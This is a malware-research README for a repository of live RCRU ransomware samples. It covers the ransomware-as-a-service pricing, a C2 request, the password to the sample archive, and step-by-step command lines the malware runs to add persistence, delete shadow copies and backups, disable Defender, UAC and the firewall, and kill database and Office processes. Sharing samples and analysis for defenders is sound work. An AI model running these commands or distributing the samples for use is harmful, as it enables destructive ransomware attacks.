# RCRU-Ransomware-Samples - IN PROGRESS
Samples from the RCRU Ransomware - may 2023

Contributers and researchers:
- petikvx
- Hodorsec

After a couple of days worth of research and simple decompiling:

## **Non-Technical details:**

RCRU is a Ransomware as a Service (RaaS) platform. The behaviour of the RCRU Ransomware looks a lot like the Goodmorning Ransomware strain.
The RCRU Ransomware operator behaves like any other ransomware operator. It will extort you for money, and most likely it will go down in price after a while. 
The reason for this is that the Ransomware operator who has bought the RCRU license for a year for a price of 2.000$ must pay a fixed amount to the creator of the program per ransomware. 
The price is: 650$ for the developer/creator of the RCRU ransomware. Everything above 650$ will go to the operator. This money needs to be transfered to a Tether wallet (TRC20).

## **Technical details:**

The RCRU ransomware encrypts the files with a private key. 
For now our research points to a simple Request to a C2 server.
The Request looks like this:

```http://xxx.xxx.xxx.xxx:3586/36_And_Netword_Drive_Size:0_Encryption_Mode:_Fast_Mode!Empty]_____10/5/2017,_10:19:56_AM$_Wed_05/17/2023-_9:45:[Version_6.1.7601|Microsoft_Windows_7_Professional_hg3l,109.70.100.68~L8amX9uxfcDWUdNkVAgjK1nseQTBML/N9zWXOltiueB1PYMnUkLwdE/ZH35G1ndV+xOOgo+4d5DoCNEChExhDWgRxI0qk/jCOgot+a7VyXCg2dVYml7acvQ7fzKskh/2euc/EwUWvMq0JIpJieDtzkguNCloSkaO6vFNxGdtkkBVxYhvCPqrf06gN4WIyPblz8wgU/ZjR1iD7y7PU8M3MPKIoPhmfsPXGYErSOxZtN8bTVT4nrzhV4JqQGgWvCJL/UwW96oJIe8WMJk1+W/2oit1OUeoBGkO4cCVs0DaBqnXf5K2m5cvJqCNajoBDaKH8bBB4EskPvaGS5RQ21IU4hfcMquq1HRc6WQHM8PdS6i9hA56UFbmR2wedpKEqWWsLPqI5gMIWyeC1sc03qmUqdSdyv6TMA80MHnZO3lTBQcM3KoRa5wmUboMWZ67hkm8ktKMMayUnf5i0//JC3v1tyYWBIHsPet4nzE4v/N3meQx6ofcO0kFFMWx8hieLhBXe4hJ7x23sCpl/aBLz0ayopAsCuWoQS+i810bdr9oJlqqx1F1bVprLCi0iRJW+29uF6SGIFihE6Mp0WLH7Bu59K1NLHfFBG6zSy9b/AgERAoIBABAvbG5p3lOmF9jZFHaCfN3XiXmpUPcIOIFbOe4/uZoQYVd9vJcA1AurOOoCF7XMb20GGAqHWJC6THi9sm3Kz0BP1I3ASQVvWyzzFTGDBGCghTqHJqtnC/P8bUmnSBCzysA4fNtQV2WQZK/Ud9TmG8GmiQ0kO9Q+lynNlgn84LosPnH6JN2kpZcySphut3lM/HhPRhaPOxDHoXctV/IOmDRrKjVm7DLLPkqSE5dUPH72Kdq5heCu71jfZUVO/hxxYEPSD+wDtT0y1SH+HIIG7o0Q+dDiRYbhKafOJox7lHceSopjJR/AfiwWPh3XHHLA+MdDytt40BgFJFdYtJf6Iq0CgYEA0g+i+KfAvzRnfBAGt+VFlQO3vL/r03PPrWRDlcm14XbAMJxn4bGoAK5iegFzsq4v7ukbcOS+WuMQR5vnweyC2eIrm9/aX4oG81+P5rVc65mhv+f5ShZhZU2HMaHBxrnNv9c1hgeNGygLIZTWIUoj4tsG13mom9SfGDEW7SEp8oMCgYEA34xeS2s3BKFa1e6YY+ShmW9YZ2ve/sHCZXotF8v7uOxXnd2+9Q+CDK5SEzdsZOFqHj7NrcO6GVIEpVP47Ps1oLuusatKUBhyXITRaZsry6/4YDeY9017H/VZtEZ6fnfKM8dCsMErxcG5nAiMvBWpy6L/xqF+1mZEkodswPc5sNUCgYEAuVkXU99Pt8TTx9Hnz2/yGhJW07hmq4RN1TpZwGavirQS/bcue9j9pj+EEUyTQ05mh4JjgbrGE/WG1cXMfe7Nz08Xa2sqGBBgfGNg2qAGscPK9J+Bm7lk/wgr/p3JGMIP5YGnsn8iJwU2/4NThsjyfN9gY8Wy49m5jdD2HIasiq8CgYBBv99/mAEfesBdCfCV2dUtIL+l8ozhhEg79sH38LNyn92IyL+xfQgh2Or2l9SWJC5FIYfJsgmO+gFdzWdUwlsRKCRSX45TyvR1kHnTxDoOu0kNPYdXy36Q7c8W541wfZXS/l7osUkcC80t5GWguxPSezwrXKzVpZuyoE0psiAG1QKBgGlvHSvBwjQtx8CftL7BFYCcJcdQo2Lt3r9TjrYx3AmjsQ9LoYPcJkKmy7SPEt4jkz0P4GpocYKMmHAQKRgDI3zcihCIq1srcb6mAy8imeFSpHZYJRRZEsz5YLvEWUoPaJd1tWf0R8Wy/e/q+AxchCHMw8wYRe0w0CYd7JNoEiVj&4DHPJ*2.999504(4)4,d5ez.microbe@zohomail.eu```

Response: 
o8g9n



Besides this request it also requests:
http://api.ipify.org/ 
173.231.16.77
104.237.62.211
64.185.227.155

## **In this repo you will find a files.zip with the following content:**
Password for the files.zip is:

``RyebWgCbGp!jHue``

**Archive.zip:**
  - Ransomware note (Readme.hta & Restore_Your_Files.txt)
  - Xinfecter.exe : https://tria.ge/230517-jp1v8aeb69
  - Manual Encrypters like: 
   - XXX_Fast.exe : https://tria.ge/230517-jvdb4sdc3t - https://app.any.run/tasks/57c5d52c-085c-4979-bb33-7790e4c43e6a (including answer from C2 server)
   - XXX_Manual.exe : https://tria.ge/230517-jv38jadc3x - https://tria.ge/s?q=10d21fc0fe5301cc22d869ba93e3ae91e7a68d3ba5d0472e7bad78bb989e23a5 - https://app.any.run/tasks/6623909b-2854-4fef-9417-796466d81270/
   - XXX_Office.exe : https://tria.ge/230517-jv6cwseb88
   - R_cfg.ini
  - decrypter.exe for a specific ID

## **important files for decryption:**

- N-Save.sys - Contains information regarding system : https://app.any.run/tasks/6623909b-2854-4fef-9417-796466d81270/
- Renc.sys - Contains information regarding system
- f__d_d.sys - Contains information regarding system

## **Ransomware behaviour in steps:**

1. C:\Windows\system32\cmd.exe /c tasklist /v /fo csv | findstr /i "dcdcf"
  1.1 tasklist /v /fo csv
  1.2 findstr /i "dcdcf"
2. Upon execution it will execute the following to load up the Xinfector.exe and add it to the startup on different locations: C:\Windows\system32\cmd.exe /c sc create SqlBakup binPath= "C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Xinfecter.exe" start=auto
  2.1 sc create SqlBakup binPath= "C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Xinfecter.exe" start=auto (step 2. and 2.1 repeats itself around 3 times)
3. C:\Windows\system32\cmd.exe /c ver
4. C:\Windows\system32\cmd.exe /c cd "%SystemDrive%\Users\%username%\AppData\"&S-2153.bat
  4.1 "C:\Windows\System32\WScript.exe" "C:\Users\admin\AppData\S-8459.vbs"
  4.2 C:\Windows\system32\cmd.exe /c ""C:\Users\admin\AppData\S-6748.bat" "
  4.3 tasklist /v
    4.3.1 find  /I /c "dcdcf" 
    4.3.2 vssadmin.exe  Delete Shadows /All /Quiet
    4.3.3 timeout  /t 15 /nobreak 
    4.3.4 tasklist  /fi "ImageName eq XXX_Manual.exe" /fo csv  
    4.3.5 find  /I "XXX_Manual.exe"
    4.3.x steps repeat around 2 times
  5. After a few system checks for time and date it will proceed to step 6 where it alters/deletes the state of the AV and removes shadow copies. 
  6. C:\Windows\system32\cmd.exe /c reg.exe add "HKLMSoftwarePoliciesMicrosoftWindows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f&reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f&vssadmin.exe Delete Shadows /All /Quiet&wmic shadowcopy delete&netsh advfirewall set currentprofile state off&netsh firewall set opmode mode=disable&netsh advfirewall firewall set rule group="Network Discovery" new enable=Yes&wbadmin delete catalog -quiet
  7. C:\Windows\system32\cmd.exe /c taskkill /im msftesql.exe&taskkill /im sqlagent.exe&taskkill /im sqlbrowser.exe&taskkill /im sqlservr.exe&taskkill /im sqlwriter.exe&taskkill /im oracle.exe&taskkill /im ocssd.exe&taskkill /im dbsnmp.exe&taskkill /im synctime.exe&taskkill /im agntsvc.exe&taskkill /im mydesktopqos.exe&taskkill /im isqlplussvc.exe&taskkill /im xfssvccon.exe&taskkill /im mydesktopservice.exe&taskkill /im ocautoupds.exe&taskkill /im agntsvc.exe&taskkill /im encsvc.exe&taskkill /im firefoxconfig.exe&taskkill /im tbirdconfig.exe&taskkill /im ocomm.exe&taskkill /im mysqld.exe&taskkill /im mysqld-nt.exe&taskkill /im mysqld-opt.exe&taskkill /im dbeng50.exe&taskkill /im sqbcoreservice.exe&taskkill /im excel.exe&taskkill /im infopath.exe&taskkill /im msaccess.exe&taskkill /im mspub.exe&taskkill /im onenote.exe&taskkill /im outlook.exe&taskkill /im powerpnt.exe&taskkill /im steam.exe&taskkill /im thebat.exe&taskkill /im thebat64.exe&taskkill /im thunderbird.exe&taskkill /im visio.exe&taskkill /im winword.exe&taskkill /im wordpad.exe


# !!  Do not run this without a sandbox environment. These are live samples and will kill your environment. I am not responsible for any damage. !!

 

